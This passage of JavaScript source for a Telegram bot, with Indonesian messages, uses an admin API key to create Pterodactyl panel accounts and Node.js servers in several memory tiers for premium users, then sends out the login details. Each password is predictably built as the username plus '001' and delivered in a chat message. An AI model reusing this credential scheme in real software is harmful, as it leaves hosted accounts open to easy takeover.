  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ],
          [{ text: '🍁 𝗕𝘂𝘆 𝗣𝗮𝗻𝗲𝗹', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/6gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '6gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '6048';
  const cpu = '170';
  const disk = '6048';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

??  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ],
          [{ text: '🍁 𝗕𝘂𝘆 𝗣𝗮𝗻𝗲𝗹', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/7gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '7gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '7048';
  const cpu = '200';
  const disk = '7048';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ],
          [{ text: '🍁 𝗕𝘂𝘆 𝗣𝗮𝗻𝗲𝗹', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/8gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '8gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '8048';
  const cpu = '230';
  const disk = '8048';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ],
          [{ text: '🍁 𝗕𝘂𝘆 𝗣𝗮𝗻𝗲𝗹', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/9gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '9gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '9048';
  const cpu = '260';
  const disk = '9048';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ],
          [{ text: '🍁 𝗕𝘂𝘆 𝗣𝗮𝗻𝗲𝗹', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/10gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '10gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '10000';
  const cpu = '290';
  const disk = '10000';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ],
          [{ text: '🍁 𝗕𝘂𝘆 𝗣𝗮𝗻𝗲𝗹', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/unli (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + 'unlimited';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '0';
  const cpu = '0';
  const disk = '0';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ],
